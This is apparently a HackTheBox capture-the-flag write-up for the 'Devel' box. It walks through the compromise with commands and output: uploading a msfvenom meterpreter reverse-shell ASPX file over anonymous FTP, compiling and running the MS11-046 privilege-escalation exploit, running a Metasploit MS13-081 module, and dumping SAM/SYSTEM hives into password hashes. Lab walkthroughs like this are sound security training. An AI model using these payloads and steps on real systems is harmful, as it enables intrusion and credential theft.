# Devel | HackTheBox

### 1. Scan
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
└──╼ [★]$ sudo nmap -A -p- -T4 10.129.45.178
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-21 11:04 UTC
Nmap scan report for 10.129.45.178
Host is up (0.22s latency).
Not shown: 65533 filtered ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  01:06AM       <DIR>          aspnet_client
| 03-17-17  04:37PM                  689 iisstart.htm
|_03-17-17  04:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|2008|7|8.1|Vista|2012 (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1 cpe:/o:microsoft:windows_server_2012
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows 7 or Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 (91%), Microsoft Windows Server 2008 R2 or Windows 8.1 (91%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (91%), Microsoft Windows 7 (91%), Microsoft Windows 7 Professional or Windows 8 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (91%), Microsoft Windows 7 SP1 or Windows Server 2008 SP2 or 2008 R2 SP1 (91%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   223.05 ms 10.10.14.1
2   223.16 ms 10.129.45.178

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 207.20 seconds

```
The machine is running Windows with FTP and a web server. The FTP allows anonymous login, and an nmap script has gone ahead and listed available files. It appears to be a backup of what's on the web server.

### 2. Check out the FTP
Let's first login and get the FTP files.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
└──╼ [★]$ ftp 10.129.45.178
Connected to 10.129.45.178.
220 Microsoft FTP Service
Name (10.129.45.178:root): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
200 PORT command successful.
150 Opening ASCII mode data connection.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
03-17-17  04:37PM               184946 welcome.png
226 Transfer complete.
ftp> cd aspnet_client
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          system_web
226 Transfer complete.
ftp> cd system_web
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          2_0_50727
226 Transfer complete.
ftp> cd 2_0_50727
250 CWD command successful.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
```
The dir tree is `/aspnet_client/system_web/2_0_50727/`. This appears to just be a standard setup for a ASP.NET web app. Before moving on I can back out and look at the FTP service itself.  
Firstly I see if I have write access.
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
└──╼ [★]$ echo "test" > test.txt
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
└──╼ [★]$ ftp 10.129.45.178
Connected to 10.129.45.178.
220 Microsoft FTP Service
Name (10.129.45.178:root): anonymous 
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> put test.txt
local: test.txt remote: test.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
6 bytes sent in 0.00 secs (177.5568 kB/s)
ftp> ls
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  01:06AM       <DIR>          aspnet_client
03-17-17  04:37PM                  689 iisstart.htm
11-24-20  09:23PM                    6 test.txt
03-17-17  04:37PM               184946 welcome.png
2O26 Transfer complete.
```
It turns out we do have write access. Based on this, I try accessing the web server through the browser. First thing I see is the IIS start page, and then navigating to http://10.129.45.178/test.txt, I see my test text file. What I previously thought was probably a backup of the website actually turned out to be the live site directory itself.

### 3. Get a shell
Generate a payload:
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~]
└──╼ [★]$ msfvenom -p windows/meterpreter/reverse_http LHOST=10.10.14.32 LPORT=9999 -f aspx > shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 341 bytes
Final size of aspx file: 2828 bytes
```
Upload it:
```bash
ftp> put shell.aspx
local: shell.aspx remote: shell.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
2864 bytes sent in 0.00 secs (43.3543 MB/s)
```
Start a handler and then access the file from the site.
```bash
msf5 exploit(multi/handler) > run

[*] Started HTTP reverse handler on http://10.10.14.32:9999
[*] http://10.10.14.32:9999 handling request from 10.129.45.180; (UUID: xe5nytun) Staging x86 payload (177241 bytes) ...
[*] Meterpreter session 5 opened (10.10.14.32:9999 -> 10.129.45.180:49161) at 2020-11-21 12:01:32 +0000

meterpreter > sysinfo
Computer        : DEVEL
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x86
System Language : el_GR
Domain          : HTB
Logged On Users : 0
Meterpreter     : x86/windows
meterpreter > getuid
Server username: IIS APPPOOL\Web
```

### 4. Enumerate from foothold
Let's start with users.
```bash
c:\Windows\System32>cd C:\Users\
C:\Users>dir
 Volume in drive C has no label.
 Volume Serial Number is 8620-71F1

 Directory of C:\Users

18/03/2017  01:16 ��    <DIR>          .
18/03/2017  01:16 ��    <DIR>          ..
18/03/2017  01:16 ��    <DIR>          Administrator
17/03/2017  04:17 ��    <DIR>          babis
18/03/2017  01:06 ��    <DIR>          Classic .NET AppPool
14/07/2009  09:20 ��    <DIR>          Public
               0 File(s)              0 bytes
               6 Dir(s)  24.612.093.952 bytes free

```
There is one other user besides Administrator called babis.
As the current user we have no access to any folder except for Public. I can work out of there to continue enumeration. Note: The IP changes here because the box needs to be reset a few times
```bash
meterpreter > cd C:\\Users\\Public
meterpreter > upload jaws.ps1
[*] uploading  : jaws.ps1 -> jaws.ps1
[*] Uploaded 16.58 KiB of 16.58 KiB (100.0%): jaws.ps1 -> jaws.ps1
[*] uploaded   : jaws.ps1 -> jaws.ps1
meterpreter > shell
Process 3892 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Public>powershell -ExecutionPolicy Bypass -File ./jaws.ps1 -OutputFile jaws_out.txt
powershell -ExecutionPolicy Bypass -File ./jaws.ps1 -OutputFile jaws_out.txt

Running J.A.W.S. Enumeration
	- Gathering User Information
	- Gathering Processes, Services and Scheduled Tasks
	- Gathering Installed Software
	- Gathering File System Information
	- Looking for Simple Priv Esc Methods


C:\Users\Public>exit
exit
meterpreter > download jaws_out.txt
[*] Downloading: jaws_out.txt -> jaws_out.txt
[*] Downloaded 43.54 KiB of 43.54 KiB (100.0%): jaws_out.txt -> jaws_out.txt
[*] download   : jaws_out.txt -> jaws_out.txt
```
The script doesn't really find anything, but it does highlight to me again that the machine is running Windows 7, so I decide to google the build number and find some exploits including MS11-046 - https://www.exploit-db.com/exploits/40564. The only requirement is local access to the machine. It should be possible to leverage the meterpreter session for this.

### 5. Compile the exploit
```bash
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~/writeups_public/HackTheBox/HTB_Devel]
└──╼ [★]$ wget https://www.exploit-db.com/raw/40564 -O ms11-046.c
--2020-11-21 13:01:16--  https://www.exploit-db.com/raw/40564
Resolving www.exploit-db.com (www.exploit-db.com)... 192.124.249.13
Connecting to www.exploit-db.com (www.exploit-db.com)|192.124.249.13|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified [text/plain]
Saving to: ‘ms11-046.c’

ms11-046.c                                              [ <=>                                                                                                             ]  31.91K  --.-KB/s    in 0s      

2020-11-21 13:01:17 (225 MB/s) - ‘ms11-046.c’ saved [32674]
─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~/writeups_public/HackTheBox/HTB_Devel]
└──╼ [★]$ i686-w64-mingw32-gcc ms11-046.c -o ms11-046.exe -lws2_32
```
### 6. Escalate to system

Upload the file through the meterpreter session and run it.
```bash
meterpreter > upload ms11-046.exe
[*] uploading  : ms11-046.exe -> ms11-046.exe
[*] Uploaded 241.68 KiB of 241.68 KiB (100.0%): ms11-046.exe -> ms11-046.exe
[*] uploaded   : ms11-046.exe -> ms11-046.exe
meterpreter > shell
Process 2108 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Public>ms11-046.exe
ms11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```

### Notes
After finishing this machine I learnt that you can use Metasploit's local exploit suggester to find escalation paths using available post modules.
```bash
msf5 post(multi/recon/local_exploit_suggester) > options

Module options (post/multi/recon/local_exploit_suggester):

   Name             Current Setting  Required  Description
   ----             ---------------  --------  -----------
   SESSION          8                yes       The session to run this module on
   SHOWDESCRIPTION  false            yes       Displays a detailed description for the available exploits

msf5 post(multi/recon/local_exploit_suggester) > run

[*] 10.129.45.188 - Collecting local exploits for x86/windows...
[*] 10.129.45.188 - 31 exploit checks are being tried...
[+] 10.129.45.188 - exploit/windows/local/bypassuac_eventvwr: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms10_015_kitrap0d: The service is running, but could not be validated.
[+] 10.129.45.188 - exploit/windows/local/ms10_092_schelevator: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms13_053_schlamperei: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms13_081_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms14_058_track_popup_menu: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms15_004_tswbproxy: The service is running, but could not be validated.
[+] 10.129.45.188 - exploit/windows/local/ms15_051_client_copy_image: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ms16_016_webdav: The service is running, but could not be validated.
[+] 10.129.45.188 - exploit/windows/local/ms16_075_reflection: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ntusermndragover: The target appears to be vulnerable.
[+] 10.129.45.188 - exploit/windows/local/ppr_flatten_rec: The target appears to be vulnerable.
[*] Post module execution completed
```
This gives a good list of exploits to test.
```bash
msf5 exploit(windows/local/ms13_081_track_popup_menu) > run

[*] Started reverse TCP handler on 10.10.14.32:4444 
[*] Launching notepad to host the exploit...
[+] Process 3652 launched.
[*] Reflectively injecting the exploit DLL into 3652...
[*] Injecting exploit into 3652...
[*] Exploit injected. Injecting payload into 3652...
[*] Payload injected. Executing exploit...
[+] Exploit finished, wait for (hopefully privileged) payload execution to complete.
[*] Sending stage (176195 bytes) to 10.129.45.188
[*] Meterpreter session 10 opened (10.10.14.32:4444 -> 10.129.45.188:49158) at 2020-11-21 13:32:29 +0000

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > shell
Process 660 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

c:\windows\system32\inetsrv>powershell -C "reg save HKLM\SYSTEM SYSTEM"
powershell -C "reg save HKLM\SYSTEM SYSTEM"
The operation completed successfully.


c:\windows\system32\inetsrv>powershell -C "reg save HKLM\SAM SAM
powershell -C "reg save HKLM\SAM SAM
The operation completed successfully.


c:\windows\system32\inetsrv>exit
meterpreter > download SAM
[*] Downloading: SAM -> SAM
[*] Downloaded 28.00 KiB of 28.00 KiB (100.0%): SAM -> SAM
[*] download   : SAM -> SAM
meterpreter > download SYSTEM
[*] Downloading: SYSTEM -> SYSTEM
[*] Downloaded 1.00 MiB of 10.06 MiB (9.94%): SYSTEM -> SYSTEM
[*] Downloaded 2.00 MiB of 10.06 MiB (19.88%): SYSTEM -> SYSTEM
[*] Downloaded 3.00 MiB of 10.06 MiB (29.83%): SYSTEM -> SYSTEM
[*] Downloaded 4.00 MiB of 10.06 MiB (39.77%): SYSTEM -> SYSTEM
[*] Downloaded 5.00 MiB of 10.06 MiB (49.71%): SYSTEM -> SYSTEM
[*] Downloaded 6.00 MiB of 10.06 MiB (59.65%): SYSTEM -> SYSTEM
[*] Downloaded 7.00 MiB of 10.06 MiB (69.59%): SYSTEM -> SYSTEM
[*] Downloaded 8.00 MiB of 10.06 MiB (79.53%): SYSTEM -> SYSTEM
[*] Downloaded 9.00 MiB of 10.06 MiB (89.48%): SYSTEM -> SYSTEM
[*] Downloaded 10.00 MiB of 10.06 MiB (99.42%): SYSTEM -> SYSTEM
[*] Downloaded 10.06 MiB of 10.06 MiB (100.0%): SYSTEM -> SYSTEM
[*] download   : SYSTEM -> SYSTEM

─[us-dedivip-1]─[10.10.14.32]─[htb-jib1337@htb-iboxwtwj3a]─[~/writeups_public/HackTheBox/HTB_Devel]
└──╼ [★]$ gosecretsdump -sam SAM -system SYSTEM
gosecretsdump v0.3.0 (@C__Sto)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
babis:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```
